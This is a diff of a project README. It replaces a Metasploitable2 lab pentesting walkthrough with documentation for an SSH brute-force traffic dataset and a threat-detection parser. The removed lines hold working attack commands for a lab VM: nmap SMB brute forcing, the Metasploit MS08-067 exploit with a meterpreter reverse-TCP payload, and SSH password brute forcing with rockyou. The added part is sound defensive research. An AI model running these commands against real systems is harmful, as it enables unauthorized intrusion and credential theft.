@@ -1,166 +1,180 @@
-# Metasploitable2 Pentesting Workflow
+# SSH Brute Force Traffic Analysis and Threat Detection
 
-This document provides a clean, structured, and professional walkthrough of working with Metasploitable2 and Kali Linux for SMB enumeration, exploitation, brute forcing, and packet capture.
-
----
-
-## Environment Setup
-
-- **Metasploitable2 IP:** `192.168.2.188`
-- **Kali Linux IP:** `192.168.2.100` (Static)
-
-To access SMB share:
-```
-smbclient //192.168.2.188/tmp -U msfadmin%msfadmin
-```
-
-You can SSH into Metasploitable2 for easier command execution.
+This repository contains a dataset extracted from malicious SSH brute force traffic (`mal_ssh.csv`) and a fully featured Python parsing engine (`parser_info.py`) that performs in-depth feature extraction, SSH protocol interpretation, TCP flag analysis, and automated threat classification suitable for cybersecurity research and machine learning pipelines.
 
 ---
 
-## Downloading and Setting Up Kali Linux and Metasploitable2
-
-### Installing VMware Workstation / VMware Player
-1. Download VMware Workstation Pro or VMware Player from the official VMware website.
-2. Install using default settings.
-3. Ensure virtualization is enabled in BIOS.
-
-### Downloading Kali Linux
-1. Visit the official Kali Linux download page.
-2. Download the Kali Linux VMware image.
-3. Extract the archive.
-4. Open VMware → File → Open → Select the `.vmx` file.
-5. Start the VM and allow VMware Tools to install if prompted.
-6. Set static IP (optional but recommended):
-```
-nm-connection-editor
-```
-
-### Downloading Metasploitable2
-1. Download Metasploitable2 from the Rapid7 website.
-2. Extract the VM archive.
-3. In VMware → File → Open → select the Metasploitable2 `.vmx`.
-4. Boot using default credentials:
-```
-username: msfadmin
-password: msfadmin
-```
-
-Ensure both VMs are connected to the same VMware network (Host-Only or NAT).
+## Table of Contents
+- [Project Overview](#project-overview)
+- [Repository Structure](#repository-structure)
+- [Dataset Description](#dataset-description)
+- [Parser Overview](#parser-overview)
+- [How to Use](#how-to-use)
+  - [1. Install Dependencies](#1-install-dependencies)
+  - [2. Run the Parser](#2-run-the-parser)
+  - [3. Output Files](#3-output-files)
+- [Feature Engineering Summary](#feature-engineering-summary)
+- [Threat Labeling Approaches](#threat-labeling-approaches)
+- [Example Workflow](#example-workflow)
+- [Notes](#notes)
 
 ---
 
-## Network Troubleshooting
+## Project Overview
+This project analyzes SSH brute force attack traffic captured from a controlled environment. The original packet capture was converted into CSV form for safe distribution. The CSV file is then parsed using a custom-built Python engine capable of:
 
-If DHCP leasing does not refresh the IP address automatically:
+- TCP attribute extraction
+- SSH protocol feature extraction
+- Threat indicator generation
+- Multi-method automated labeling
+- Feature generation for machine learning
+
+This enables researchers to build supervised models for SSH intrusion detection.
+
+---
+
+## Repository Structure
 ```
-sudo systemctl restart networking
-ip addr
+root/
+├── mal_ssh.csv               # Extracted malicious SSH traffic (CSV)
+├── parser_info.py            # Feature extraction + labeling engine
+├── README.md                 # Project documentation
+└── requirements.txt          # Python dependencies
 ```
 
 ---
 
-## SMB Brute-Force Enumeration via Nmap
+## Dataset Description
+The file `mal_ssh.csv` contains traffic exported from Wireshark using the "Packet List as CSV" format.
 
-Run Nmap SMB brute-force script:
-```
-sudo nmap --script smb-brute.nse -p 445 192.168.2.188
-```
+Typical columns include:
+- Packet number
+- Timestamp
+- Source IP
+- Destination IP
+- Protocol
+- Length
+- Info
 
----
-
-## Exploiting MS08-067 (Windows SMB Vulnerability)
-
-Launch Metasploit:
-```
-sudo msfconsole
-```
-
-Load exploit:
-```
-use exploit/windows/smb/ms08_067_netapi
-set RHOSTS 192.168.2.188
-```
-
-Optional: List payloads
-```
-show payloads
-```
-
-Set payload:
-```
-set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.2.100
-```
-
-Exploit:
-```
-exploit
-```
-
-### If exploit fails, use a specific target profile
-```
-use exploit/windows/smb/ms08_067_netapi
-set TARGET 17
-```
-Target 17 corresponds to **Windows XP SP3 (x86)**, which is compatible with Metasploitable2's Samba service behavior.
+The parser normalizes these and extracts dozens of derived features for threat analysis.
 
 ---
 
-## Unix Samba Exploit Path
+## Parser Overview
+The parser (`parser_info.py`) implements a class **SSHThreatParser** which performs:
 
-Metasploitable2 primarily uses **Samba on Linux**, so Unix-focused SMB exploits may be more accurate depending on the scenario.
+### 1. TCP Feature Extraction
+- Ports
+- SYN/ACK/FIN/RST/PSH/URG flags
+- Flag counts
+- Connection state inference
+- Sequence/ack numbers
+- Window size, MSS, timestamps
 
----
+### 2. SSH Protocol Feature Extraction
+- SSH version
+- Implementation (e.g., OpenSSH)
+- Role (client/server)
+- Key exchange states
+- Diffie-Hellman stages
+- Encrypted packet lengths
 
-## SSH Brute Forcing with Metasploit
+### 3. Threat Indicator Engine
+- Failed connection counter
+- Rapid connection attempts
+- SSH brute force patterns
+- High volume SSH activity
+- Connection rate / failure rate analysis
 
-Start Metasploit:
-```
-sudo msfconsole
-```
-
-Load SSH brute-force module:
-```
-use auxiliary/scanner/ssh/ssh_login
-```
-
-Set options:
-```
-set RHOSTS 192.168.2.188
-set USER_FILE /usr/share/wordlists/usernames.txt
-set PASS_FILE /usr/share/wordlists/rockyou.txt
-set THREADS 20
-set VERBOSE true
-```
-
-Check current configuration:
-```
-show options
-```
-
-View running jobs:
-```
-jobs
-```
+### 4. Threat Classification
+Includes four labeling methods:
+- Improved (default)
+- Simple
+- Aggregate
+- Original legacy
 
 ---
 
-## Packet Capture on Kali Linux
+## How to Use
 
-Capture SSH brute force traffic:
+### 1. Install Dependencies
 ```
-sudo tcpdump -i eth0 host 192.168.2.188 and port 22 -w ssh_bruteforce.pcap
+pip install -r requirements.txt
 ```
+Dependencies include:
+- pandas
+- numpy
+
+### 2. Run the Parser
+```
+python parser_info.py
+```
+This will:
+- Load `mal_ssh.csv`
+- Parse and extract features
+- Compute threat indicators
+- Label traffic with `MALICIOUS` / `BENIGN`
+- Save output to:
+
+```
+ssh_threat_detection_dataset.csv
+```
+
+### 3. Output Files
+After execution, you will have:
+
+- **ssh_threat_detection_dataset.csv**  
+  (fully processed ML‑ready dataset)
+
+Contains all derived TCP/SSH/threat features + final labels.
+
+---
+
+## Feature Engineering Summary
+The final dataset contains:
+
+- TCP-level features
+- SSH protocol features
+- Derived timing features
+- Threat indicator heuristics
+- Multi-stage brute force detection flags
+- Connection classification states
+- Inter-packet timing
+- Connection frequency per source IP
+
+The parser is designed to generate a complete ML‑ready dataset without additional preprocessing.
+
+---
+
+## Threat Labeling Approaches
+
+### **Improved Mode (default)**
+Uses connection rate, failure rate, SSH volume, and burst patterns.
+
+### **Simple Mode**
+Labels based on direct SSH traffic or packet-level failure conditions.
+
+### **Aggregate Mode**
+Uses source IP–level behavior aggregates.
+
+### **Original Mode**
+Legacy compatibility, provided for completeness.
+
+---
+
+## Example Workflow
+1. Capture SSH brute force traffic in a controlled environment.
+2. Export packet list as CSV from Wireshark.
+3. Place the CSV file into the repository.
+4. Run the parser to generate:
+   - Full feature set
+   - Threat-labeled dataset
+5. Use the output CSV for machine learning experiments.
 
 ---
 
 ## Notes
-- Ensure both machines are on the same subnet.
-- Disable firewall if testing isolated labs.
-- Use only on authorized systems.
-
----
-
-End of Document.
-
+- All data comes from a controlled lab environment.
+- No sensitive or real-world user data is included.
+- The dataset is safe to publish and intended for cybersecurity research.
+- The parser is extensible and can be adapted for additional protocols.
